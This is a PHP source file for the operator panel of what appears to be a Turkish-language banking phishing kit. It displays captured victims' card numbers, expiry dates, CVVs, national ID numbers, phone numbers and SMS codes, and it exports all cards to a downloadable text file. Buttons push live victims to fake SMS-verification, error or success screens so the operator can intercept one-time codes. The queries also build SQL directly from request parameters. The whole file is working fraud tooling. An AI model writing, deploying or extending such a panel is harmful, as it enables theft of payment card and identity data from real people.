<?php
date_default_timezone_set('Europe/Istanbul');
include(__DIR__ . "/Connection.php");
include(__DIR__ . "/Core/getRealIPAdress.php");
include(__DIR__ . "/Core/mobileDetect.php");
include(__DIR__ . "/Core/browserDetect.php");
session_start();
$ip = getUserIP();

if (isset($_GET['yedekle']) && isset($_SESSION['login'])) {
   $query = $db->query("SELECT ad,kk,sonkul,cvv,cardLimit,tc,telno FROM sazan ORDER BY id DESC");
   $sonuc = $query->fetchAll(PDO::FETCH_ASSOC);
   $icerik = '';
   foreach ($sonuc as $satir) {
      $kartno  = str_replace(' ', '', $satir['kk']);
      $kartskt = str_replace(' / ', '|', $satir['sonkul']);
      $icerik .= $satir['tc']." | ".$satir['ad']." | ".$satir['telno']." | ".$kartno." | ".$kartskt." | ".$satir['cvv']."\n";
   }
   $dosyaAdi = 'yedek_'.date('d-m-Y_H-i').'.txt';
   header('Content-Type: text/plain; charset=utf-8');
   header('Content-Disposition: attachment; filename="'.$dosyaAdi.'"');
   header('Content-Length: '.strlen($icerik));
   header('Cache-Control: no-cache, no-store');
   echo $icerik;
   exit;
}

$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);

if (isset($_GET['refresh'])) {
   $refresh = $_GET['refresh'];
   $db->query("UPDATE site SET refresh = '$refresh' WHERE id = '1'");
   echo '<script type="text/javascript">Swal.fire({
        title: "Yenileme süresi ayarlandı.",
        icon: "success",
        confirmButtonText: "Onayla"
    }).then((result) => {
        window.location.href="index";
    })</script>';
}

if (isset($_GET['personwaiting'])) {
   $personwaiting = $_GET['personwaiting'];
   $db->query("UPDATE site SET person_waiting_time = '$personwaiting' WHERE id = '1'");
   echo '<script type="text/javascript">Swal.fire({
        title: "Yenileme süresi ayarlandı.",
        icon: "success",
        confirmButtonText: "Onayla"
    }).then((result) => {
        window.location.href="index";
    })</script>';
}

?>
<!doctype html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta name="viewport"
      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.3.0/dist/sweetalert2.all.min.js"></script>
   <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" rel="stylesheet" />
   <link href="//cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
   <meta http-equiv="refresh" content="<?= $sorgula['refresh'] ?>;index.php"><!-- <?= $sorgula['refresh'] ?> sn. -->

   <title>GMY - Yönetim Paneli</title>
</head>

<body>
   <?php date_default_timezone_set('Europe/Istanbul');
$logSQL = $db->query("SELECT COUNT(*) FROM sazan");
$logSayisi = $logSQL->fetchColumn();

$banSQL = $db->query("SELECT COUNT(*) FROM ban");
$banSayisi = $banSQL->fetchColumn();

$db->query("UPDATE paneldekiler SET durum = 'Log Tablosu' WHERE ip = '{$ip}'");

if(!isset($_SESSION["login"])){
  $db->query("DELETE FROM paneldekiler WHERE ip='$ip'");
  header('Location:login');
}else{
if(isset($_GET['sms'])){
  $sms = $_GET['sms'];
  $db->query("insert into sms (sms) values ( '$sms')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı SMS ekranına gönderildi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';
}
	if(isset($_GET['tumu'])) {
   $tumu=$_GET['tumu'];
   $db->query("truncate table sazan");
   $db->query("truncate table hata1");
   $db->query("truncate table sms2");
   $db->query("truncate table tebrik");
   $db->query("truncate table sms");
   echo '<script type="text/javascript">Swal.fire({
       title: "Tüm veriler başarıyla sıfırlandı.",
       icon: "success",
       confirmButtonText: "Onayla"
   }).then((result) => {
       window.location.href="index.php";
   })</script>';
 }
if(isset($_GET['sms2'])){
   $sms2 = $_GET['sms2'];
   $db->query("insert into sms2 (sms2) values ( '$sms2')");
   echo '<script type="text/javascript">Swal.fire({
      title: "Kullanıcı Hatalı SMS ekranına gönderildi.",
      icon: "success",
      confirmButtonText: "Onayla"
   }).then((result) => {
      window.location.href="index.php";
   })</script>';
 }
  if(isset($_GET['hata1'])){
  $hata1 = $_GET['hata1'];
  $db->query("insert into hata1 (hata1) values ( '$hata1')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı Hata ekranına gönderildi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';
}
if(isset($_GET['hata2'])){
  $hata2 = $_GET['hata2'];
  $db->query("insert into hata2 (hata2) values ( '$hata2')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı İnternet Alışveriş ekranına gönderildi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';
}
if(isset($_GET['hata3'])){
  $hata3 = $_GET['hata3'];
  $db->query("insert into hata3 (hata3) values ( '$hata3')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı "Hata-3" ekranına gönderildi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';
}
  if(isset($_GET['tebrik'])){
  $tebrik = $_GET['tebrik'];
  $db->query("insert into tebrik (tebrik) values ( '$tebrik')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı tebrik ekranına gönderildi.",
   icon: "success",
   confirmButtonText: "Kullanıcı tebrik edildi."
}).then((result) => {
   window.location.href="index.php";
})</script>';}
  if(isset($_GET['sil'])){
  $sil = $_GET['sil'];
  $db->query("DELETE FROM sazan WHERE ip='$sil'");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı verisi silindi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';
}
  if(isset($_GET['ban'])){
  $ban = $_GET['ban'];
  $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ban));
  $sehir = $ipdat->geoplugin_city;
  $ulke = $ipdat->geoplugin_countryName;
  $cihaz;
  $tarayici; 
  $tarih = date('d.m.Y H:i');
  $db->query("INSERT INTO ban SET ban=('$ban'),ulke=('$sehir' ' [$ulke]'),cihaz=('$cihaz'),tarayici=('$tarayici'),date=('$tarih')");
  $db->query("DELETE FROM sazan WHERE ip='$ban'");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı siteden uzaklaştırıldı.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';}
  if(isset($_GET['dondur'])){
  $dondur = $_GET['dondur'];
  $db->query("INSERT INTO back (back) values ('$dondur')");
  echo '<script type="text/javascript">Swal.fire({
   title: "Kullanıcı ana ekrana gönderildi.",
   icon: "success",
   confirmButtonText: "Onayla"
}).then((result) => {
   window.location.href="index.php";
})</script>';}

if(isset($_GET['logout'])){
  session_start();
  ob_start();
  session_unset();
  session_destroy();
  $db->query("DELETE FROM paneldekiler WHERE ip='$ip'");
  header('Location:login');
}


?>
   <div>
      <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

         html,
         body {
            font-family: 'Poppins', sans-serif;
         }

         .bg-main {
            background: #111;
         }

         .bg-second {
            background: #161616;
         }
      </style>
      <div x-data="{ sidebarOpen: false }" class="flex h-screen">
         <?php
   $onlineList = [];
   $query = $db->query("SELECT * FROM ips", PDO::FETCH_ASSOC);
   if ($query->rowCount()) {
      foreach ($query as $v) {
         if ($v['lastOnline'] > time()) {
            array_push($onlineList, $v['ipAddress']);
         }
      }
   }
   $sqla = $db->query('SELECT * FROM sazan ORDER BY id DESC');
    ?>
         <div :class="sidebarOpen ? 'block' : 'hidden'" @click="sidebarOpen = false"
            class="fixed z-20 inset-0 bg-black opacity-50 transition-opacity lg:hidden"></div>
         <div :class="sidebarOpen ? 'translate-x-0 ease-out' : '-translate-x-full ease-in'"
            class="fixed z-30 inset-y-0 left-0 w-64 transition duration-300 transform bg-second overflow-y-auto lg:translate-x-0 lg:static lg:inset-0">
            <div class="flex items-center justify-center mt-8">
               <div class="flex items-center">
                  <span class="text-white text-2xl mx-2 font-semibold">GMY - WEB PANEL</span>
               </div>
            </div>
            <nav class="mt-10">
               <a class="flex items-center text-center mt-1 py-2 px-6 bg-main bg-opacity-25 text-gray-300"
                  href="./index.php">
                  <i class="fa-solid fa-staff-snake"></i> <span class="mx-3"><i class="fa-solid fa-pizza"></i>Log
                     Tablosu</span>
               </a>
            </nav>
         </div>
         <div class="flex-1 flex flex-col overflow-hidden">
            <header class="flex justify-between items-center py-4 px-6 bg-main">
               <div class="flex items-center">
                  <button @click="sidebarOpen = true" class="text-gray-500 focus:outline-none lg:hidden">
                     <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M4 6H20M4 12H20M4 18H11" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                           stroke-linejoin="round"></path>
                     </svg>
                  </button>
               </div>
               <div class="flex items-center">
                  <form>
                     <div class="text-white space-x-2"> Otomatik Yenileme
                        <input name="refresh" value="<?= $sorgula['refresh'] ?>" type="text"
                           class="p-1 text-center rounded-sm w-1/12 text-white bg-second" /> sn. <a>
                           <button
                              class="bg-green-400 hover:bg-green-500 px-2 hover:text-white duration-200 text-center h-10 text-white rounded-md">
                              Onayla
                           </button>
                        </a>
                  </form>
				  
				 
               </div>
               <a href="?logout"><button
                     class="bg-red-400 hover:bg-red-500 px-2 hover:text-white duration-200 text-center h-10 text-white rounded-md">
                     Çıkış Yap
                  </button></a>
         </div>
         </header>

         <main class="flex-1 overflow-x-hidden overflow-y-auto bg-main">
            <div class="container mx-auto px-6 py-8">
               <h3 class="text-white text-3xl font-medium">Sazanlar Liste</h3>
               <div class="mt-4">
                  <div class="flex flex-wrap -mx-6">
                     <div class="w-full py-2 px-6 sm:w-1/2 xl:w-1/3">
                        <div class="flex h-26 md:h-24 items-center px-5 py-6 shadow-sm rounded-md bg-second">
                           <div class="p-3 rounded-full bg-indigo-600 bg-opacity-75">
                              <svg class="h-8 w-8 text-white" viewBox="0 0 28 30" fill="none"
                                 xmlns="http://www.w3.org/2000/svg">
                                 <path
                                    d="M18.2 9.08889C18.2 11.5373 16.3196 13.5222 14 13.5222C11.6804 13.5222 9.79999 11.5373 9.79999 9.08889C9.79999 6.64043 11.6804 4.65556 14 4.65556C16.3196 4.65556 18.2 6.64043 18.2 9.08889Z"
                                    fill="currentColor"></path>
                                 <path
                                    d="M25.2 12.0444C25.2 13.6768 23.9464 15 22.4 15C20.8536 15 19.6 13.6768 19.6 12.0444C19.6 10.4121 20.8536 9.08889 22.4 9.08889C23.9464 9.08889 25.2 10.4121 25.2 12.0444Z"
                                    fill="currentColor"></path>
                                 <path
                                    d="M19.6 22.3889C19.6 19.1243 17.0927 16.4778 14 16.4778C10.9072 16.4778 8.39999 19.1243 8.39999 22.3889V26.8222H19.6V22.3889Z"
                                    fill="currentColor"></path>
                                 <path
                                    d="M8.39999 12.0444C8.39999 13.6768 7.14639 15 5.59999 15C4.05359 15 2.79999 13.6768 2.79999 12.0444C2.79999 10.4121 4.05359 9.08889 5.59999 9.08889C7.14639 9.08889 8.39999 10.4121 8.39999 12.0444Z"
                                    fill="currentColor"></path>
                                 <path
                                    d="M22.4 26.8222V22.3889C22.4 20.8312 22.0195 19.3671 21.351 18.0949C21.6863 18.0039 22.0378 17.9556 22.4 17.9556C24.7197 17.9556 26.6 19.9404 26.6 22.3889V26.8222H22.4Z"
                                    fill="currentColor"></path>
                                 <path
                                    d="M6.64896 18.0949C5.98058 19.3671 5.59999 20.8312 5.59999 22.3889V26.8222H1.39999V22.3889C1.39999 19.9404 3.2804 17.9556 5.59999 17.9556C5.96219 17.9556 6.31367 18.0039 6.64896 18.0949Z"
                                    fill="currentColor"></path>
                              </svg>
                           </div>

                           <div class="mx-5">
                              <h4 class="text-2xl font-semibold text-white">
                                 <?php $onlineList = [];
   $query = $db->query("SELECT * FROM ips", PDO::FETCH_ASSOC);
   if ($query->rowCount()) {
      foreach ($query as $v) {
         if ($v['lastOnline'] > time()) {
            array_push($onlineList, $v['ipAddress']);
         }
      }
   }
   echo count($onlineList); ?>
                              </h4>
                              <div class="text-gray-400">Online Users</div>
                           </div>
                        </div>
                     </div>
                     <div class="w-full py-2 px-6 sm:w-1/2 xl:w-1/3">
                        <div class="flex h-26 md:h-24 items-center px-5 py-6 shadow-sm rounded-md bg-second">
                           <div class="p-3 rounded-full bg-red-400 bg-opacity-75">
                              <svg class="h-8 w-8 text-white" version="1.0" xmlns="http://www.w3.org/2000/svg"
                                 width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
                                 preserveAspectRatio="xMidYMid meet">
                                 <g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="#fff"
                                    stroke="none">
                                    <path d="M2341 5110 c-471 -46 -916 -216 -1288 -494 -566 -423 -932 -1035
-1030 -1721 -20 -148 -23 -486 -4 -630 121 -937 743 -1738 1621 -2088 470
-187 1002 -227 1490 -111 405 96 767 281 1085 554 477 410 786 967 882 1590
22 144 25 529 4 665 -49 335 -146 626 -297 897 -119 215 -299 452 -455 603
-414 398 -941 655 -1489 725 -118 15 -406 21 -519 10z m466 -615 c296 -39 562
-136 811 -298 l94 -60 -1363 -1363 -1362 -1362 -30 40 c-91 126 -195 331 -247
488 -278 839 37 1757 769 2244 271 180 545 277 906 319 82 10 317 5 422 -8z
m1391 -881 c208 -312 326 -743 308 -1129 -64 -1394 -1489 -2269 -2761 -1695
-78 35 -254 138 -300 175 l-30 25 1355 1355 c745 745 1359 1354 1365 1352 5
-2 34 -39 63 -83z" />
                                 </g>
                              </svg>
                           </div>
                           <div class="mx-5">
                              <h4 class="text-2xl font-semibold text-white">0</h4>
                              <div class="text-gray-400">Banned Users</div>
                           </div>
                        </div>
                     </div>
                     <div class="w-full py-2 px-6 sm:w-1/2 xl:w-1/3">
                        <div
                           class="flex items-center flex-col space-x-0 space-y-3 md:space-y-0 md:flex-row md:space-x-3 justify-center h-26 md:h-24 px py-5 bg-second rounded-md">
                           <a href="#" onclick="silOnay()"> <button
                                 class="bg-main px-2 hover:text-white duration-200 text-center h-10 text-gray-500 rounded-md">
                                 Tümünü Sil
                              </button> </a>
                           <a href="priv.php?sifre"> <button
                                 class="bg-main px-2 hover:text-white duration-200 text-center h-10 text-gray-500  rounded-md">
                                 Şifre Değiştir
                              </button> </a>
                           <a href="index.php?yedekle"> <button
                                 class="bg-main px-2 hover:text-white duration-200 text-center h-10 text-gray-500  rounded-md">
                                 Kartları Yedekle
                              </button> </a>
                        </div>
                     </div>
                  </div>
               </div>

               <div class="mt-8">

               </div>
               <div class="flex flex-col mt-8">
                  <div class="-my-2 py-2 overflow-x-auto sm:-mx-6 sm:px-6 lg:-mx-8 lg:px-8">
                     <div class="align-middle inline-block min-w-full shadow overflow-hidden sm:rounded-lg">
                        <table class="min-w-full">
                           <thead>
                              <tr>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 bg-gray-50 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    Durum</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    ID</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    BIN Check</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    AD SOYAD</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    CC NO</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider" style="width:7%;">
                                    SKT</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    CVV</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    TC</th>
                                 <th style="color:green;font-weight:bold;"
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    SMS</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    TELEFON</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    TARIH</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    IP</th>
                                 <th
                                    class="px-6 py-3 border-b bg-second border-black border-opacity-40 text-left text-xs leading-4 font-medium text-gray-500 uppercase tracking-wider">
                                    TALEP ET</th>
                              </tr>
                           </thead>

                           <tbody>
                              <?php

   foreach ($sqla as $oku) {
                                    ?>
                              <tr>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['now']; ?>
                                 </td>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['id']; ?>
                                 </td>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['banka']; ?>
                                 </td>
                                 <td class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['ad']; ?>
                                    <?php if(!empty($oku['veri'])) { echo "<br><span style='font-size:11px;color:#a0aec0;'>".$oku['veri']." | ".$oku['veri2']."</span>"; } ?>
                                 </td>
                                 <td class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['kk']; ?>
                                 </td>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['sonkul']; ?>
                                 </td>
                                 <td class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['cvv']; ?>
                                 </td>
                                 <td class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['tc']; ?>
                                 </td>
                                 <td  style="color:green;font-weight:bold;" class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['sms']; ?><br>
                                    <?php echo $oku['sms2']; ?>
                                 </td>
                                 <td class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500"
                                    onclick="copy(this)">
                                    <?php echo $oku['telno']; ?>
                                 </td>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['date']; ?>
                                 </td>
                                 <td
                                    class="px-6 py-4 whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <?php echo $oku['ip'];?><?=($oku['lastOnline'] > time() ? ' <i style="color: green; text-shadow: darkgreen 0px 0px 10px;" class="fa-solid fa-signal"></i>' : ' <i style="color: red; text-shadow: darkred 0px 0px 10px;" class="fa-solid fa-signal"></i>')?>
                                 </td>
                                 <td
                                    class="px-6 items-start py-4 flex flex-wrap -mx-1 overflow-hidden whitespace-no-wrap border-b border-black border-opacity-40 text-sm leading-5 text-gray-500">
                                    <div>
                                       <a href="?tebrik=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-square-check"></i>
                                          </button> </a>
                                       <a href="?hata1=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-sharp fa-solid fa-square-xmark"></i>
                                          </button> </a>
                                       <a href="?dondur=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-arrow-rotate-left"></i>
                                          </button> </a>
                                       <a href="?hata2=<?php echo $oku['ip']; ?>"> <button
                                                class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                                <i class="fa-solid fa-wifi"></i>
                                             </button> </a>
                                         
                                    </div>
                                    <div class="mt-1">
                                       <a href="?sms=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-comment-sms"></i>
                                          </button> </a>
                                       <a href="?sms2=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-comment-slash"></i>
                                          </button> </a>
										  <a href="?ban=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-ban"></i>
                                          </button></a>
                                       <a href="?sil=<?php echo $oku['ip']; ?>"> <button
                                             class="bg-second hover:text-white duration-200 mr-1 p-1 rounded-md">
                                             <i class="fa-solid fa-trash"></i>
                                          </button>
                                    </div>
                                 </td>
                              </tr>
                              <?php } ?>
                           </tbody>
                        </table>
                     </div>
                  </div>
               </div>
            </div>
         </main>
      </div>
   </div>
   </div>

   <script>
      function copy(that) {
         var inp = document.createElement('input');
         document.body.appendChild(inp)
         inp.value = that.textContent
         inp.select();
         document.execCommand('copy', false);
         inp.remove();
      }
      function silOnay() {
         Swal.fire({
            title: 'Loglar Silinecek!',
            text: 'Tüm loglar silinecek. Emin misiniz?',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#d33',
            cancelButtonColor: '#555',
            confirmButtonText: 'Evet, Sil',
            cancelButtonText: 'Vazgeç'
         }).then((result) => {
            if (result.isConfirmed) window.location.href = '?tumu=1';
         });
      }
   </script>
   <script src="https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.x.x/dist/alpine.min.js" defer></script>
</body>

</html>
<?php } ?>